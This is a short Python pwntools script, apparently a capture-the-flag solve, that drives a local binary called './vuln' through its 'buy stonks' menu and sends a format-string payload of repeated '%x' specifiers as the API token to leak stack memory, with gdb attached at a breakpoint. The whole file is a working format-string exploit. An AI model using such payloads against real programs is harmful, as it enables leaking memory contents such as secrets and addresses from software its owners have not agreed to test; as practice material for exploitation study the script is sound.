#!/bin/usr/python3
from pwn import *

# buy stonks puts addr
# b *0x400a94
elf = context.binary = ELF("./vuln")
context.log_level = "debug"
context.delete_corefiles = True
context.terminal = ["tmux", "split", "-h"]

def start():
	p = process("./vuln")
	gdb.attach(p, gdbscript = """
		b *0x400a94
		continue
	""")
	return p

io = start()
io.sendlineafter("2) View my portfolio", "1")
#payload = "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p$$$%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."
payload = "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.$$$%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.$$$%x.%x.%x.%x"
io.sendlineafter("What is your API token?", payload)
io.recvuntil("Buying stonks with token:\n")
leak = io.recvline()
info("leak = %s", leak)


